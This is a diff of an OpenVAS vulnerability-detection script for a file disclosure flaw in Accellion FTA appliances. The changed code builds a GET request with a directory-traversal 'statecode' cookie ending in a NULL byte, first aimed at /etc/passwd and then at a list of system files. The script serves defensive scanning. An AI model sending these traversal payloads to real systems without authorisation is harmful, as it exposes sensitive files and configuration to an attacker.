@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_accellion_fta_file_discl_vuln.nasl 11492 2018-09-20 08:38:50Z mmartin $
+# $Id: gb_accellion_fta_file_discl_vuln.nasl 11831 2018-10-11 07:49:24Z jschulte $
 #
 # Accellion FTA File Disclosure Vulnerability
 #
@@ -30,8 +30,8 @@ CPE = 'cpe:/h:accellion:secure_file_transfer_appliance';
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.106031");
-  script_version("$Revision: 11492 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-20 10:38:50 +0200 (Thu, 20 Sep 2018) $");
+  script_version("$Revision: 11831 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
   script_tag(name:"creation_date", value:"2015-07-28 09:48:42 +0700 (Tue, 28 Jul 2015)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
@@ -48,7 +48,7 @@ if (description)
 
   script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("gb_accellion_fta_detect.nasl");
+  script_dependencies("gb_accellion_fta_detect.nasl", "os_detection.nasl");
   script_mandatory_keys("accellion_fta/installed");
 
   script_tag(name:"summary", value:"Accellion FTA is prone to a file disclosure vulnerability");
@@ -56,12 +56,12 @@ if (description)
   script_tag(name:"vuldetect", value:"Send a crafted GET request and check if we can read system files.");
 
   script_tag(name:"insight", value:"The vulnerability is triggered when a user-provided 'statecode'
-cookie parameter is appended to a file path that is processed as a HTML template. By prepending this
-cookie with directory traversal sequence and appending a NULL byte, any file readable by the web user
-can be exposed.");
+  cookie parameter is appended to a file path that is processed as a HTML template. By prepending this
+  cookie with directory traversal sequence and appending a NULL byte, any file readable by the web user
+  can be exposed.");
 
   script_tag(name:"impact", value:"An attacker can read sensitive files, including the system
-configuration and files uploaded to the appliance by users.");
+  configuration and files uploaded to the appliance by users.");
 
   script_tag(name:"affected", value:"Accellion FTA Version 9.11.200 and prior.");
 
@@ -74,6 +74,7 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 include("version_func.inc");
+include("misc_func.inc");
 
 if (!port = get_app_port(cpe: CPE))
   exit(0);
@@ -98,20 +99,27 @@ else {
   if (dir == "/")
     dir = "";
 
-  host = http_host_name(port: port);
-  url = dir + '/intermediate_login.html';
-  cookie = 'statecode=../../../../../etc/passwd%00';
-  useragent = get_http_user_agent();
+  files = traversal_files();
 
-  req = 'GET ' + url + ' HTTP/1.1\r\n' +
-        'Host: ' + host + '\r\n' +
-        'User-Agent: ' + useragent + '\r\n' +
-        'Cookie: ' + cookie + '\r\n\r\n';
+  foreach pattern(keys(files)) {
 
-  buf = http_keepalive_send_recv(port: port, data: req);
-  if (buf =~ "root:.*:0:[01]:") {
-    security_message(port: port);
-    exit(0);
+    file = files[pattern];
+
+    host = http_host_name(port: port);
+    url = dir + '/intermediate_login.html';
+    cookie = 'statecode=../../../../../' + file + '%00';
+    useragent = get_http_user_agent();
+
+    req = 'GET ' + url + ' HTTP/1.1\r\n' +
+          'Host: ' + host + '\r\n' +
+          'User-Agent: ' + useragent + '\r\n' +
+          'Cookie: ' + cookie + '\r\n\r\n';
+
+    buf = http_keepalive_send_recv(port: port, data: req);
+    if (egrep(string:buf, pattern:pattern)) {
+      security_message(port: port);
+      exit(0);
+    }
   }
 }
 
